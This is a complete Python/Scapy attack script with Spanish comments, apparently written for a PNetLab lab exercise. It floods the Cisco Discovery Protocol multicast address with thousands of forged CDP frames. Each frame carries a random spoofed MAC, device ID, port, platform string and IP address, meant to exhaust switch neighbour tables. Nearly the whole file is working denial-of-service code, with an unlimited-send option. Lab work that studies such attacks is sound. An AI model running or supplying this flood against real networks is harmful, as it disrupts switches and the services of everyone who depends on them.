from scapy.all import (
    Ether, SNAP, LLC, sendp, RandMAC, RandString
)
import struct
import random
import time
import sys
 
# ──────────────────────────────────────────────
# CONFIGURACIÓN
# ──────────────────────────────────────────────
IFACE        = "ens3"
ATTACKER_MAC = "50:76:9b:00:05:00"
CDP_DST_MAC  = "01:00:0c:cc:cc:cc"   # Multicast CDP
PACKET_COUNT = 10000                  # 0 = infinito
DELAY        = 0.001                  # segundos entre paquetes
 
# ──────────────────────────────────────────────
# CONSTRUCCIÓN MANUAL DEL PAYLOAD CDP
# ──────────────────────────────────────────────
 
def cdp_tlv(type_id: int, value: bytes) -> bytes:
    """Genera un TLV CDP: Type(2) + Length(2) + Value"""
    length = 4 + len(value)
    return struct.pack("!HH", type_id, length) + value
 
 
def cdp_checksum(data: bytes) -> int:
    """Calcula checksum de 16 bits (complemento a uno)."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF
 
 
def build_cdp_packet(fake_mac: str) -> bytes:
    """
    Construye un frame CDP completo con identidad aleatoria.
    Estructura: Ethernet → LLC/SNAP → CDP header → TLVs
    """
    # TLVs CDP
    device_id   = "SW-" + fake_mac.replace(":", "")          # TLV 0x0001
    port_id     = "Ethernet0/{}".format(random.randint(0, 48)) # TLV 0x0003
    platform    = random.choice([                              # TLV 0x0006
        b"cisco WS-C3750",
        b"cisco WS-C2960",
        b"cisco C9200L",
        b"cisco C3560CX",
    ])
    capabilities = struct.pack("!I", 0x00000028)               # Router+Switch
    ip_raw       = bytes([10, random.randint(0, 255),
                          random.randint(0, 255),
                          random.randint(1, 254)])
 
    # TLV Addresses (TLV 0x0002)
    addr_proto  = b'\x01\x01\xcc'            # NLPID IPv4
    addr_entry  = struct.pack("!B", len(addr_proto)) + addr_proto + \
                  struct.pack("!H", 4) + ip_raw
    addr_tlv_val= struct.pack("!I", 1) + addr_entry  # 1 dirección
 
    tlvs  = cdp_tlv(0x0001, device_id.encode())
    tlvs += cdp_tlv(0x0002, addr_tlv_val)
    tlvs += cdp_tlv(0x0003, port_id.encode())
    tlvs += cdp_tlv(0x0004, capabilities)
    tlvs += cdp_tlv(0x0006, platform)
    tlvs += cdp_tlv(0x0005, b'\x00\x78')     # TTL = 120 s
 
    # CDP Header: versión(1) + TTL(1) + checksum(2) + TLVs
    cdp_header_no_cs = struct.pack("!BBH", 2, 180, 0) + tlvs
    cs = cdp_checksum(cdp_header_no_cs)
    cdp_payload = struct.pack("!BBH", 2, 180, cs) + tlvs
 
    # LLC + SNAP
    llc_snap = (
        b'\xaa\xaa\x03'          # DSAP=0xAA, SSAP=0xAA, Control=0x03
        b'\x00\x00\x0c'          # OUI Cisco
        b'\x20\x00'              # PID CDP
    )
 
    # Ethernet frame crudo
    dst  = bytes.fromhex(CDP_DST_MAC.replace(":", ""))
    src  = bytes.fromhex(fake_mac.replace(":", ""))
    frame_data = llc_snap + cdp_payload
    etype = struct.pack("!H", len(frame_data))
    raw_frame = dst + src + etype + frame_data
    return raw_frame
 
 
def run_cdp_flood():
    print("=" * 60)
    print("  CDP DoS FLOOD — Laboratorio PNetLab")
    print("=" * 60)
    print(f"  Interfaz  : {IFACE}")
    print(f"  MAC origen: {ATTACKER_MAC} (+ MACs aleatorias)")
    print(f"  Destino   : {CDP_DST_MAC}  (CDP multicast)")
    print(f"  Paquetes  : {'∞' if PACKET_COUNT == 0 else PACKET_COUNT}")
    print(f"  Delay     : {DELAY}s")
    print("=" * 60)
    print("  Iniciando flood... (Ctrl+C para detener)\n")
 
    sent = 0
    start = time.time()
 
    try:
        while PACKET_COUNT == 0 or sent < PACKET_COUNT:
            # MAC de origen aleatorio en cada paquete → más entradas en tabla
            fake_mac = str(RandMAC())
            raw = build_cdp_packet(fake_mac)
 
            # Enviamos el frame crudo usando Scapy con L2socket
            from scapy.all import conf, SuperSocket
            sock = conf.L2socket(iface=IFACE)
            sock.send(raw)
            sock.close()
 
            sent += 1
            if sent % 500 == 0:
                elapsed = time.time() - start
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"  [*] Enviados: {sent:>6}  |  {pps:>8.1f} pkt/s", end="\r")
 
    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("\n[!] Error: ejecutar con sudo")
        sys.exit(1)
 
    elapsed = time.time() - start
    print(f"\n\n  [+] Total enviados : {sent}")
    print(f"  [+] Tiempo         : {elapsed:.2f}s")
    print(f"  [+] Tasa promedio  : {sent/elapsed:.1f} pkt/s")
    print("  [+] Ataque finalizado.\n")
 
 
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)
    run_cdp_flood()
